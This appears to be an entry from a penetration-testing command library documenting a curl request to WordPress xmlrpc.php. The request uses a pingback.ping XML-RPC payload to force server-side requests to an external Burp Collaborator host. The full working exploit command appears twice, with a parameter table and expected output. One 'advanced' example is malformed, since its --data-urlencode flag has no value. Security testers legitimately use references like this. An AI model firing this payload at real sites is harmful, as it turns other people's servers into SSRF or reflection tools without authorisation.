---
id: cmd-curl-xml-post
data: >-
  curl -X POST https://target/xmlrpc.php -H "Content-Type: text/xml" -d '<?xml
  version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://oast-xyz.burpcollaborator.net</string></value></param><param><value><string>https://target/</string></value></param></params></methodCall>'
tags:
  - exploit
  - ssrf
  - xml
type: command
output: HTTP 200 OK with XML response (success or fault).
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:46.001Z'
verified: false
validated: true
submitted: true
---
# curl-xml-post

## Command

```bash
curl -X POST https://target/xmlrpc.php -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://oast-xyz.burpcollaborator.net</string></value></param><param><value><string>https://target/</string></value></param></params></methodCall>'
```

## Description

This command sends a POST request with an XML-RPC payload to exploit SSRF via pingback.ping in WordPress xmlrpc.php, forcing a request to an external URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Sets HTTP method to POST | Yes |
| `-H "Content-Type: text/xml"` | Specifies XML content type | Yes |
| `-d 'XML payload'` | The XML data to send | Yes |
| `https://target/xmlrpc.php` | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target/xmlrpc.php -H "Content-Type: text/xml" -d '<xml payload>'
```

### Advanced Usage

```bash
curl -X POST -v https://target/xmlrpc.php -H "Content-Type: text/xml" -d '<xml>' --data-urlencode
```

## Expected Output

Server response like <methodResponse> with faultCode if error, or empty success, triggering OOB callback.

## Related

- [[commands/curl-basic-get]]
- [[procedures/Send-SSRF-Exploit-Request]]
